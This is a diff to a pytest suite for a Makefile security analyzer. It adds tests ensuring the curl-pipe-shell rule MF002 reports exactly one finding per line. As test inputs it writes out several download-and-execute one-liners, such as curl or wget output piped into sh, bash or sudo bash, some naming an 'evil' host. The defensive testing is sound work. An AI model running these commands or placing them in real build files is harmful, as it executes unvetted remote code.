@@ -73,6 +73,21 @@ class TestMF002CurlPipeShell:
         issues = analyzer.analyze("Makefile", content)
         assert not any(i.rule_id == "MF002" for i in issues)
 
+    @pytest.mark.parametrize(
+        "recipe",
+        [
+            "curl -sSL https://example.com/install.sh | sh",
+            "curl -sSL https://example.com/install.sh | sudo bash",
+            "wget -qO- https://example.com/i.sh | bash",
+        ],
+    )
+    def test_one_finding_per_line(self, analyzer, recipe):
+        """Overlapping MF002 patterns report one finding per line (#155)."""
+        issues = analyzer.analyze("Makefile", f"install:\n\t{recipe}\n")
+        mf002 = [i for i in issues if i.rule_id == "MF002"]
+        assert len(mf002) == 1
+        assert mf002[0].confidence == 0.98
+
     def test_commented_recipe_line_ignored(self, analyzer):
         """Commented recipe lines should be ignored."""
         content = "all:\n\t# curl https://evil | sh\n"
@@ -166,6 +181,6 @@ class TestLineNumberAccuracy:
         content = "a:\n\techo ok\nb:\n\tcurl -fsSL https://evil | sh\n"
         issues = analyzer.analyze("Makefile", content)
         mf002 = [i for i in issues if i.rule_id == "MF002"]
-        assert len(mf002) >= 1
+        assert len(mf002) == 1
         # curl|sh is on line 4
         assert mf002[0].line == 4
